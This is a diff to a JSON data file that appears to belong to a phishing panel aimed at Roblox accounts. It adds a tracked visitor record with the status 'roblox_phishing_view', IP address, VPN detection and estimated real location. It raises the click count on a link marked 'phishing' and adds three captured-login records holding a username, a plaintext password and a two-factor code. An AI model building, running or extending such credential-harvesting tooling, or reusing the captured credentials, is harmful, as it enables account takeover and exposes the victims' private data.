@@ -32,13 +32,13 @@
       }
     ],
     [
-      "0f2de3fa-a7a2-4293-8c0b-21ccab66d777",
+      "3a44954e-357f-4a4b-8a27-e0ca72e691a6",
       {
         "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
-        "sessionToken": "0f2de3fa-a7a2-4293-8c0b-21ccab66d777",
-        "expiresAt": "2025-09-14T21:32:26.126Z",
-        "id": "f73e2516-6f81-4e82-981d-c7f55350a619",
-        "createdAt": "2025-09-07T21:32:26.126Z"
+        "sessionToken": "3a44954e-357f-4a4b-8a27-e0ca72e691a6",
+        "expiresAt": "2025-09-14T21:46:46.274Z",
+        "id": "55d15dc5-53c9-47b1-8bf9-79b17d9c0631",
+        "createdAt": "2025-09-07T21:46:46.274Z"
       }
     ]
   ],
@@ -262,6 +262,26 @@
         "deviceBrand": "Apple",
         "timestamp": "2025-09-07T21:40:19.293Z"
       }
+    ],
+    [
+      "1207392c-a268-4d82-888b-5936555e0d14",
+      {
+        "id": "1207392c-a268-4d82-888b-5936555e0d14",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "referrer": null,
+        "location": "Chicago, US [VPN: Surfshark]",
+        "status": "roblox_phishing_view",
+        "isVpn": "yes",
+        "vpnLocation": "Chicago, US (Surfshark)",
+        "realLocation": "Osaka, Japan (Estimated Real Location)",
+        "deviceType": "unknown",
+        "browserName": "Chrome",
+        "operatingSystem": "unknown",
+        "deviceBrand": "Apple",
+        "timestamp": "2025-09-07T21:46:59.063Z"
+      }
     ]
   ],
   "settings": [
@@ -375,10 +395,10 @@
         "linkType": "phishing",
         "trackingId": "64e9f1dd",
         "title": "TEST",
-        "clickCount": 1,
+        "clickCount": 2,
         "isActive": true,
         "createdAt": "2025-09-07T21:40:09.943Z",
-        "updatedAt": "2025-09-07T21:40:19.300Z"
+        "updatedAt": "2025-09-07T21:46:59.072Z"
       }
     ]
   ],
@@ -396,8 +416,50 @@
         "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
         "createdAt": "2025-09-07T21:33:09.060Z"
       }
+    ],
+    [
+      "4d034eba-7cc5-4389-a0ae-6bcb48a50d44",
+      {
+        "id": "4d034eba-7cc5-4389-a0ae-6bcb48a50d44",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "linkId": "6711c1d6-6151-420a-9f77-aae254f6a6a5",
+        "capturedUsername": "poisonxtree",
+        "capturedPassword": "Av121988",
+        "capturedAuthCode": null,
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "createdAt": "2025-09-07T21:47:22.564Z"
+      }
+    ],
+    [
+      "377503fd-d253-4ad7-973c-d1b7521d99a1",
+      {
+        "id": "377503fd-d253-4ad7-973c-d1b7521d99a1",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "linkId": "6711c1d6-6151-420a-9f77-aae254f6a6a5",
+        "capturedUsername": "poisonxtree",
+        "capturedPassword": "Av121988",
+        "capturedAuthCode": null,
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "createdAt": "2025-09-07T21:47:46.965Z"
+      }
+    ],
+    [
+      "ffe2e848-d939-4099-9e96-90c0c36aac4e",
+      {
+        "id": "ffe2e848-d939-4099-9e96-90c0c36aac4e",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "linkId": "6711c1d6-6151-420a-9f77-aae254f6a6a5",
+        "capturedUsername": "poisonxtree",
+        "capturedPassword": "Av121988",
+        "capturedAuthCode": "506058",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "createdAt": "2025-09-07T21:47:50.490Z"
+      }
     ]
   ],
-  "timestamp": "2025-09-07T21:41:32.313Z",
+  "timestamp": "2025-09-07T21:49:14.902Z",
   "version": "2.2"
 }
